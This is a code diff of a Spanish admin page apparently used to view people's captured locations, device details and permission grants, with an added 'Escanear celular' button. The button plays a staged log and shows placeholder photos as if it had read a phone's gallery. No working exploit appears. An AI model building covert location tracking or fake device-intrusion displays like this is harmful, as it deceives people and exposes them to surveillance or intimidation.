@@ -2,7 +2,7 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale-1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Admin - Datos de Usuarios</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 20px; background-color: #f4f5f7; }
@@ -21,6 +21,10 @@
             padding-bottom: 5px; 
             margin-top: 0;
         }
+        h3 {
+            color: #d9534f; /* Color rojo para el permiso de galería */
+            margin-top: 20px;
+        }
         
         p { line-height: 1.6; }
         
@@ -37,6 +41,71 @@
             color: #777; 
             font-size: 1.1em;
         }
+
+        /* --- ESTILOS PARA LA SIMULACIÓN DE GALERÍA --- */
+        .scan-btn {
+            background-color: #d9534f;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 5px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        .scan-btn:hover {
+            background-color: #c9302c;
+        }
+        .scan-btn:disabled {
+            background-color: #aaa;
+            cursor: not-allowed;
+        }
+
+        .scan-results {
+            margin-top: 15px;
+            background-color: #f9f9f9;
+            border: 1px solid #eee;
+            padding: 15px;
+            border-radius: 5px;
+        }
+        
+        .scan-log {
+            font-family: 'Courier New', Courier, monospace;
+            color: #555;
+            font-size: 14px;
+            margin-bottom: 10px;
+        }
+
+        .folder {
+            margin-top: 15px;
+        }
+        .folder-title {
+            font-size: 1.2em;
+            font-weight: 600;
+            color: #333;
+            border-bottom: 1px solid #ccc;
+            padding-bottom: 5px;
+        }
+        .photo-grid {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .photo-item {
+            width: 100px;
+            height: 100px;
+            background-color: #eee;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        .photo-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
     </style>
 </head>
 <body>
@@ -47,6 +116,8 @@
             {% for sub in submissions %}
                 <div class="submission">
                     <h2>📍 Nueva Ubicación Registrada</h2>
+                    <p><strong>Recibido:</strong> {{ sub.timestamp }}</p>
+                    <p><strong>Dispositivo:</strong> {{ sub.device_info }}</p>
                     
                     {% if sub.latitude %}
                         <p>
@@ -55,11 +126,18 @@
                         </p>
                         <p>
                             <a href="https://www.google.com/maps?q={{ sub.latitude }},{{ sub.longitude }}" target="_blank">
-                                Ver en Google Maps &rarr;
+                                Ver en Google Maps →
                             </a>
                         </p>
                     {% else %}
-                        <p><em>Error al registrar la ubicación.</em></p>
+                        <p><em>El usuario denegó el permiso de ubicación.</em></p>
+                    {% endif %}
+                    
+                    {% if sub.gallery_permission %}
+                        <h3>🖼️ Acceso a Galería Concedido</h3>
+                        <p>El usuario aceptó los permisos de acceso a la galería.</p>
+                        <button class="scan-btn" data-sub-id="{{ sub.id }}">Escanear celular</button>
+                        <div class="scan-results" id="scan-results-{{ sub.id }}"></div>
                     {% endif %}
                     
                 </div>
@@ -69,5 +147,89 @@
         {% endif %}
 
     </div>
+
+    <script>
+        document.querySelectorAll('.scan-btn').forEach(button => {
+            button.addEventListener('click', (event) => {
+                const btn = event.currentTarget;
+                const subId = btn.dataset.subId;
+                const resultsContainer = document.getElementById(`scan-results-${subId}`);
+                
+                // Deshabilitar botón
+                btn.disabled = true;
+                btn.textContent = "Escaneando...";
+                
+                resultsContainer.innerHTML = ''; // Limpiar resultados anteriores
+
+                const foldersToSimulate = [
+                    { name: 'Viaje Julio 2025', count: 12 },
+                    { name: 'En el campo', count: 8 },
+                    { name: 'Fotos Programacion', count: 5 },
+                    { name: 'Fotos Simulador de tiro', count: 15 }
+                ];
+
+                const scanLog = [
+                    "Iniciando escaneo...",
+                    "Conectando con dispositivo...",
+                    "Accediendo al sistema de archivos...",
+                    `Carpeta encontrada: <strong>${foldersToSimulate[0].name}</strong> (${foldersToSimulate[0].count} imágenes)`,
+                    "Escaneando metadatos...",
+                    `Carpeta encontrada: <strong>${foldersToSimulate[1].name}</strong> (${foldersToSimulate[1].count} imágenes)`,
+                    `Carpeta encontrada: <strong>${foldersToSimulate[2].name}</strong> (${foldersToSimulate[2].count} imágenes)`,
+                    "Analizando subdirectorios...",
+                    `Carpeta encontrada: <strong>${foldersToSimulate[3].name}</strong> (${foldersToSimulate[3].count} imágenes)`,
+                    "Escaneo completado. Mostrando resultados."
+                ];
+
+                let logIndex = 0;
+
+                function showNextLog() {
+                    if (logIndex < scanLog.length) {
+                        const logEntry = document.createElement('div');
+                        logEntry.classList.add('scan-log');
+                        logEntry.innerHTML = `> ${scanLog[logIndex]}`;
+                        resultsContainer.appendChild(logEntry);
+                        resultsContainer.scrollTop = resultsContainer.scrollHeight; // Auto-scroll
+                        
+                        logIndex++;
+                        setTimeout(showNextLog, 600); // 600ms de retraso por línea
+                    } else {
+                        // Terminar simulación y mostrar carpetas
+                        showGalleryResults();
+                    }
+                }
+
+                function showGalleryResults() {
+                    btn.textContent = "Escaneo Completo"; // Botón queda deshabilitado
+                    
+                    foldersToSimulate.forEach((folder, folderIndex) => {
+                        const folderEl = document.createElement('div');
+                        folderEl.classList.add('folder');
+                        
+                        folderEl.innerHTML = `<div class="folder-title">📁 ${folder.name} (${folder.count} fotos)</div>`;
+                        
+                        const photoGrid = document.createElement('div');
+                        photoGrid.classList.add('photo-grid');
+                        
+                        for(let i = 0; i < folder.count; i++) {
+                            const photoEl = document.createElement('div');
+                            photoEl.classList.add('photo-item');
+                            // Usamos un número aleatorio para que cada foto sea diferente
+                            const randomId = (folderIndex * 100) + i;
+                            photoEl.innerHTML = `<img src="https://picsum.photos/100/100?random=${randomId}" alt="foto simulada">`;
+                            photoGrid.appendChild(photoEl);
+                        }
+                        
+                        folderEl.appendChild(photoGrid);
+                        resultsContainer.appendChild(folderEl);
+                    });
+                }
+
+                // Iniciar el log simulado
+                showNextLog();
+            });
+        });
+    </script>
+
 </body>
 </html>
